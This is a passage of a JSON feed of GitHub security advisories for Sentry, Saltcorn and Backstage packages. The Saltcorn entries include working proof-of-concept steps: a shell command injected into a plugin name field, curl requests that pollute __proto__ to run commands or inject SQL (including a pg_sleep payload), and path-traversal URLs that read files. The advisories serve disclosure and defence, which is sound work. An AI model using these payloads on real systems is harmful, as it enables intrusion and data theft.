            "date_modified": "2024-10-04T18:50:57.000Z",
            "date_published": "2024-10-04T18:50:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8xq9-g7ch-35hg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In case a Prototype Pollution vulnerability is present in a user's application or bundled libraries, the Sentry SDK could potentially serve as a gadget to exploit that vulnerability. The exploitability depends on the specific details of the underlying Prototype Pollution issue.</p>\n<blockquote>\n<p>[!NOTE]\nThis advisory does not indicate the presence of a Prototype Pollution within the Sentry SDK itself. Users are strongly advised to first address any Prototype Pollution vulnerabilities in their application, as they pose a more critical security risk.</p>\n</blockquote>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue was patched in all Sentry JavaScript SDKs starting from the <a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0\">8.33.0</a> version.\nAlso, the fix was backported to SDK v7 in <a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1\">7.119.1</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://portswigger.net/web-security/prototype-pollution\">Prototype Pollution</a></li>\n<li><a href=\"https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets\">Prototype Pollution gadgets</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/13838\">sentry-javascript#13838</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/13838\">https://github.com/getsentry/sentry-javascript/pull/13838</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766\">https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0\">https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1\">https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-593m-55hh-j8gv\">https://github.com/advisories/GHSA-593m-55hh-j8gv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-593m-55hh-j8gv",
            "title": "[@sentry/browser] Sentry SDK Prototype Pollution gadget in JavaScript SDKs",
            "date_modified": "2024-10-04T16:32:04.000Z",
            "date_published": "2024-10-03T18:26:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-593m-55hh-j8gv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In case a Prototype Pollution vulnerability is present in a user's application or bundled libraries, the Sentry SDK could potentially serve as a gadget to exploit that vulnerability. The exploitability depends on the specific details of the underlying Prototype Pollution issue.</p>\n<blockquote>\n<p>[!NOTE]\nThis advisory does not indicate the presence of a Prototype Pollution within the Sentry SDK itself. Users are strongly advised to first address any Prototype Pollution vulnerabilities in their application, as they pose a more critical security risk.</p>\n</blockquote>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue was patched in all Sentry JavaScript SDKs starting from the <a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0\">8.33.0</a> version.\nAlso, the fix was backported to SDK v7 in <a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1\">7.119.1</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://portswigger.net/web-security/prototype-pollution\">Prototype Pollution</a></li>\n<li><a href=\"https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets\">Prototype Pollution gadgets</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/13838\">sentry-javascript#13838</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/13838\">https://github.com/getsentry/sentry-javascript/pull/13838</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766\">https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0\">https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1\">https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-593m-55hh-j8gv\">https://github.com/advisories/GHSA-593m-55hh-j8gv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-593m-55hh-j8gv",
            "title": "[@sentry/browser] Sentry SDK Prototype Pollution gadget in JavaScript SDKs",
            "date_modified": "2024-10-04T16:32:04.000Z",
            "date_published": "2024-10-03T18:26:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-593m-55hh-j8gv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When creating a new plugin using the <code>git</code> source, the user-controlled value <code>req.body.name</code> is used to build the plugin directory where the location will be cloned. The API used to execute the <code>git clone</code> command with the user-controlled data is <code>child_process.execSync</code>. Since the user-controlled data is not validated, a user with admin permission can add escaping characters and execute arbitrary commands, leading to a command injection vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>Relevant code from source (<code>req.body</code>) to sink (<code>child_process.execSync</code>).</p>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400</a></li>\n</ul>\n<pre><code class=\"language-js\">router.post(\n  \"/\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const plugin = new Plugin(req.body); // [1] \n      [...]\n      try {\n        await load_plugins.loadAndSaveNewPlugin( // [3] \n          plugin,\n          schema === db.connectObj.default_schema || plugin.source === \"github\"\n        );\n        [...]\n    }\n  })\n);\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44</a></li>\n</ul>\n<pre><code class=\"language-js\">class Plugin {\n  [...]\n  constructor(o: PluginCfg | PluginPack | Plugin) {\n    [...]\n    this.name = o.name; // [2] \n    [...]\n}\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65</a></li>\n</ul>\n<pre><code class=\"language-js\">const loadAndSaveNewPlugin = async (plugin, force, noSignalOrDB) =&gt; {\n  [...]\n  const loader = new PluginInstaller(plugin); // [4] \n  const res = await loader.install(force); // [7] \n  [...]\n};\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61</a></li>\n</ul>\n<pre><code class=\"language-js\">class PluginInstaller {\n  constructor(plugin, opts = {}) {\n    [...]\n    const tokens =\n      plugin.source === \"npm\"\n        ? plugin.location.split(\"/\")\n        : plugin.name.split(\"/\"); // [5] \n    [...]\n    this.tempDir = join(this.tempRootFolder, \"temp_install\", ...tokens); // [6] \n    [...]\n  }\n\n  \n  async install(force) {\n    [...]\n    if (await this.prepPluginsFolder(force, pckJSON)) { // [8] \n    [...]\n  }\n\n  async prepPluginsFolder(force, pckJSON) {\n    [...]\n    switch (this.plugin.source) {\n      [...]\n      case \"git\":\n        if (force || !(await pathExists(this.pluginDir))) { \n          await gitPullOrClone(this.plugin, this.tempDir); // [9] \n      [...]\n  }\n</code></pre>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112</a></li>\n</ul>\n<pre><code class=\"language-js\">const gitPullOrClone = async (plugin, pluginDir) =&gt; {\n  [...]\n  if (fs.existsSync(pluginDir)) {\n    execSync(`git ${setKey} -C ${pluginDir} pull`);\n  } else {\n    execSync(`git ${setKey} clone ${plugin.location} ${pluginDir}`); // [10] \n  }\n  [...]\n};\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>check that the file will be created by the command <code>echo \"hello\"&gt;/tmp/HACKED</code> does not exists:</li>\n</ul>\n<pre><code>cat /tmp/HACKED\ncat: /tmp/HACKED: No such file or directory\n</code></pre>\n<ul>\n<li>login with an admin account</li>\n<li>visit <code>http://localhost:3000/plugins/new</code></li>\n<li>enter the following fields:<ul>\n<li>Name: <code>;echo \"hello\"&gt;/tmp/HACKED</code></li>\n<li>Source: <code>git</code></li>\n<li>other fields blank</li>\n</ul>\n</li>\n<li>click <code>Create</code></li>\n<li>you will get an error saying <code>ENOENT: no such file or directory,  ....</code> but the command <code>touch /tmp/HACKED</code> will be executed</li>\n<li>to verify:</li>\n</ul>\n<pre><code>cat /tmp/HACKED\nhello\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote code execution</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Sanitize the <code>pluginDir</code> value before passing to <code>execSync</code>. Alternatively, use <code>child_process. execFileSync</code> API (docs: <a href=\"https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options\">https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options</a>)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-fm76-w8jw-xf8m\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-fm76-w8jw-xf8m</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192\">https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fm76-w8jw-xf8m\">https://github.com/advisories/GHSA-fm76-w8jw-xf8m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fm76-w8jw-xf8m",
            "title": "[@saltcorn/plugins-loader] @saltcorn/plugins-loader unsanitized plugin name leads to a remote code execution (RCE) vulnerability when creating plugins using git source",
            "date_modified": "2024-10-04T16:51:27.000Z",
            "date_published": "2024-10-03T22:21:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fm76-w8jw-xf8m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The endpoint <code>/site-structure/localizer/save-string/:lang/:defstring</code> accepts two parameter values: <code>lang</code> and <code>defstring</code>. These values are used in an unsafe way to set the keys and value of the <code>cfgStrings</code> object. It allows to add/modify properties of the <code>Object prototype</code> that result in several logic issues, including:</p>\n<ul>\n<li>RCE vulnerabilities by polluting the <code>tempRootFolder</code> property </li>\n<li>SQL injection vulnerabilities by polluting the <code>schema</code> property when using <code>PostgreSQL</code> database.</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239</a></li>\n</ul>\n<pre><code class=\"language-js\">router.post(\n  \"/localizer/save-string/:lang/:defstring\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const { lang, defstring } = req.params; // source\n\n    const cfgStrings = getState().getConfigCopy(\"localizer_strings\");\n    if (cfgStrings[lang]) cfgStrings[lang][defstring] = text(req.body.value); // [1] sink\n    else cfgStrings[lang] = { [defstring]: text(req.body.value) };\n    await getState().setConfig(\"localizer_strings\", cfgStrings);\n    res.redirect(`/site-structure/localizer/edit/${lang}`);\n  })\n);\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Setup:</p>\n<ul>\n<li>set <code>SALTCORN_NWORKERS=1</code> before starting the <code>saltcorn</code> server (to easily observe the behavior of the PoC)</li>\n</ul>\n<pre><code>SALTCORN_NWORKERS=1 saltcorn serve\n</code></pre>\n<ul>\n<li>make sure to use PostgresSQL backend</li>\n<li>login with a user with admin permission</li>\n</ul>\n<h4 id=\"rce\">RCE</h4>\n<p>This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain command executed.</p>\n<ul>\n<li>check that the file that will be created does not exists:</li>\n</ul>\n<pre><code>cat /tmp/RCE\ncat: /tmp/RCE: No such file or directory\n</code></pre>\n<ul>\n<li>pollute the <code>Object.prototype</code> with a <code>tempRootFolder</code> value set to <code>;echo+\"rce\"|tee+/tmp/RCE;</code> by sending the following request *** :</li>\n</ul>\n<pre><code class=\"language-bash\">curl -i -X $'POST' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \\\n    -H $'Origin: http://localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    --data-binary $'_csrf=VALID_csrf_Value&amp;value=;echo+\"rce\"|tee+/tmp/RCE;' \\\n    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/tempRootFolder'\n</code></pre>\n<p> visit <code>http://localhost:3000/plugins/new</code></p>\n<ul>\n<li>enter the following fields:<ul>\n<li>Name: <code>test</code></li>\n<li>Source: <code>git</code></li>\n<li>other fields blank</li>\n<li>click <code>Create</code></li>\n</ul>\n</li>\n<li>you will get an error but the command <code>echo \"rce\" | tee /tmp/RCE</code> will be executed</li>\n<li>to verify:</li>\n</ul>\n<pre><code>cat /tmp/RCE\nrce\n</code></pre>\n<p>The RCE occurs because after the previous curl request, the <code>tempRootFolder</code> property is set to <code>;echo+\"rce\"|tee+/tmp/RCE;</code> that is later used to build the shell commands.</p>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58</a></li>\n</ul>\n<pre><code class=\"language-js\">class PluginInstaller {\n  constructor(plugin, opts = {}) { // opts will have the tempRootFolder property set with dangerous values // [2]\n    [...]\n    this.tempRootFolder =\n      opts.tempRootFolder || envPaths(\"saltcorn\", { suffix: \"tmp\" }).temp; // [3]\n     [...]\n    this.pckJsonPath = join(this.pluginDir, \"package.json\");\n    this.tempDir = join(this.tempRootFolder, \"temp_install\", ...tokens); // [4]\n    [...]\n  }\n  [...]\n}\n</code></pre>\n<h4 id=\"sql-injection\">SQL Injection</h4>\n<p>This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain SQL queries (i.e SQLi).</p>\n<ul>\n<li>visit <code>http://localhost:3000/table</code> to check the page returns some results (no errors)</li>\n<li>pollute the <code>Object.prototype</code> with a schema value set to <code>\"</code> (just to create an exception in the query that will be executed to demonstrate the issue) by sending the following request *** :</li>\n</ul>\n<pre><code>curl -i -X $'POST' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \\\n    -H $'Origin: http://localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    --data-binary $'_csrf=VALID_csrf_Value&amp;value=\\\"' \\\n    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/schema'\n</code></pre>\n<ul>\n<li>visit again <code>http://localhost:3000/table</code> but this time an SQL error will appear:</li>\n</ul>\n<pre><code>syntax error at or near \"\" order by lower(\"\"\n</code></pre>\n<p><strong>NOTE</strong>: Another payload to use as <code>value</code> could be <code>pg_user\"+WHERE+1=1+AND+(SELECT+pg_sleep(5))+IS+NOT+NULL+--</code></p>\n<p>The SQL injection occurs because after the previous curl request, the <code>schema</code> property is set to <code>\"</code>.</p>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101</a></li>\n</ul>\n<pre><code class=\"language-js\">const select = async (tbl, whereObj, selectopts = {}) =&gt; { // [2] selectopts\n  const { where, values } = mkWhere(whereObj);\n  const schema = selectopts.schema || getTenantSchema(); // [3] selectopts.schema\n  const sql = `SELECT ${\n    selectopts.fields ? selectopts.fields.join(\", \") : `*`\n  } FROM \"${schema}\".\"${sqlsanitize(tbl)}\" ${where} ${mkSelectOptions( // [4] schema\n    selectopts,\n    values,\n    false\n  )}`;\n  sql_log(sql, values);\n  const tq = await (client || selectopts.client || pool).query(sql, values);\n\n  return tq.rows;\n};\n</code></pre>\n<p>*** Retrieve valid values for the <code>connect.sid</code> (<code>VALID_CONNECT_SID_COOKIE</code>) and <code>_csrf</code> values (<code>VALID_csrf_Value</code>) :</p>\n<ul>\n<li>open the browser developer console and go to the <code>Network</code> tab</li>\n<li>visit <code>http://localhost:3000/site-structure/localizer/add-lang</code></li>\n<li>add a language (<code>Name: test</code> , <code>Locale: test</code>) and click <code>Save</code></li>\n<li>under the <code>Network</code> tab, filter for <code>save-lang</code> and check the request parameters (<code>Headers</code> and <code>Payload</code>/<code>Request</code> tabs)</li>\n<li>copy the values for <code>connect.sid</code> and <code>_csrf</code> and paste in the curl command above</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote code execution (RCE), Sql injection and business logic errors.</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Check the values of <code>lang</code> and  <code>defstring</code> parameters against dangerous properties like <code>__proto__</code>, <code>constructor</code>, <code>prototype</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-78p3-fwcq-62c2\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-78p3-fwcq-62c2</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/9e066ae8ba317469053cc27e95dcdf5b6e60e12d\">https://github.com/saltcorn/saltcorn/commit/9e066ae8ba317469053cc27e95dcdf5b6e60e12d</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78p3-fwcq-62c2\">https://github.com/advisories/GHSA-78p3-fwcq-62c2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78p3-fwcq-62c2",
            "title": "[@saltcorn/server] @saltcorn/server Remote Code Execution (RCE) / SQL injection via prototype pollution  by manipulating `lang` and  `defstring` parameters when setting localizer strings",
            "date_modified": "2024-10-04T16:51:45.000Z",
            "date_published": "2024-10-03T19:50:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78p3-fwcq-62c2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user with admin permission can read arbitrary file and directory names on the filesystem by calling the <code>admin/build-mobile-app/result?build_dir_name=</code> endpoint.  The <code>build_dir_name</code> parameter is not properly validated and it's then used to construct the <code>buildDir</code> that is read. The file/directory names under the <code>buildDir</code> will be returned. </p>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893</a></li>\n</ul>\n<pre><code class=\"language-js\">router.get(\n  \"/build-mobile-app/result\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const { build_dir_name } = req.query; // [1] source\n    const rootFolder = await File.rootFolder();\n    const buildDir = path.join(\n      rootFolder.location,\n      \"mobile_app\",\n      build_dir_name // [2]\n    );\n    const files = await Promise.all(\n      fs\n        .readdirSync(buildDir) // [3] sink\n        .map(async (outFile) =&gt; await File.from_file_on_disk(outFile, buildDir))\n    );\n    [...]\n  })\n);\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>log into the application as an admin user</li>\n<li>visit the following url: <code>http://localhost:3000/admin/build-mobile-app/result?build_dir_name=/../../../../../../../../</code></li>\n</ul>\n<p><strong>NOTE</strong>: it's possible to only see file and directory names but not to download their content.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Information disclosure</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Resolve the <code>buildDir</code> and check if it starts with <code>${rootFolder.location}/mobile_app</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-cfqx-f43m-vfh7\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-cfqx-f43m-vfh7</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/81adaf78430a9b59804894574d67d2a0c7bb3dc5\">https://github.com/saltcorn/saltcorn/commit/81adaf78430a9b59804894574d67d2a0c7bb3dc5</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cfqx-f43m-vfh7\">https://github.com/advisories/GHSA-cfqx-f43m-vfh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cfqx-f43m-vfh7",
            "title": "[@saltcorn/server] @saltcorn/server arbitrary file and directory listing when accessing build mobile app results",
            "date_modified": "2024-10-04T16:51:51.000Z",
            "date_published": "2024-10-03T19:46:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cfqx-f43m-vfh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user with admin permission can read and download arbitrary zip files when downloading auto backups. The file name used to identify the zip file is not properly sanitized when passed to <code>res.download</code> API.</p>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682</a></li>\n</ul>\n<pre><code class=\"language-js\">router.get(\n  \"/auto-backup-download/:filename\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const { filename } = req.params; // [1] source\n    [...]\n    if (\n      !isRoot ||\n      !(filename.startsWith(backup_file_prefix) &amp;&amp; filename.endsWith(\".zip\")) // [2]\n    ) {\n      res.redirect(\"/admin/backup\");\n      return;\n    }\n    const auto_backup_directory = getState().getConfig(\"auto_backup_directory\");\n    res.download(path.join(auto_backup_directory, filename), filename); // [3] sink\n  })\n);\n</code></pre>\n<h3 id=\"steps-to-reproduce-poc\">Steps to reproduce (PoC)</h3>\n<ul>\n<li>create a file with <code>.zip</code> extension under <code>/tmp</code> folder:</li>\n</ul>\n<pre><code>echo \"secret12345\" &gt; /tmp/secret.zip\n</code></pre>\n<ul>\n<li>log into the application as an admin user</li>\n<li>visit the url   <code>http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip</code></li>\n<li>download the zip file and then check if the zip was indeed downloaded:</li>\n</ul>\n<pre><code class=\"language-bash\">cat secret.zip\nsecret12345\n</code></pre>\n<ul>\n<li>Alternatively send the following request to retrieve the file just created.</li>\n</ul>\n<pre><code class=\"language-bash\">curl -i -X $'GET' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    $'http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip'\n</code></pre>\n<p><strong>NOTE</strong>:\nTo obtain a valid <code>connect.sid</code> cookie, just open the developer console while logged and retrieve the cookie value.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary zip files download (information disclosure).</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Resolve the <code>filename</code> parameter before checking if it starts with <code>backup_file_prefix</code> .</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192\">https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-277h-px4m-62q8\">https://github.com/advisories/GHSA-277h-px4m-62q8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-277h-px4m-62q8",
            "title": "[@saltcorn/server] @saltcorn/server arbitrary file zip read and download when downloading auto backups",
            "date_modified": "2024-10-04T16:51:58.000Z",
            "date_published": "2024-10-03T19:46:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-277h-px4m-62q8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Configuration supplied through <code>APP_CONFIG_*</code> environment variables, for example <code>APP_CONFIG_backend_listen_port=7007</code>, where unexpectedly ignoring the visibility defined in configuration schema. This occurred even if the configuration schema specified that they should have backend or secret visibility. This was an intended feature of the <code>APP_CONFIG_*</code> way of supplying configuration, but now clearly goes against the expected behavior of the configuration system. This behavior leads to a risk of potentially exposing sensitive configuration details intended to remain private or restricted to backend processes.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has been resolved in version <code>0.3.75</code> of the <code>@backstage/plugin-app-backend</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>As a temporary measure, avoid supplying secrets using the <code>APP_CONFIG_</code> configuration pattern. Consider alternative methods for setting secrets, such as the <a href=\"https://backstage.io/docs/conf/writing#environment-variable-substitution\">environment substitution</a> available for Backstage configuration.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in the <a href=\"https://github.com/backstage/backstage\">Backstage repository</a>\nVisit our Discord, linked to in <a href=\"https://github.com/backstage/backstage\">Backstage README</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a 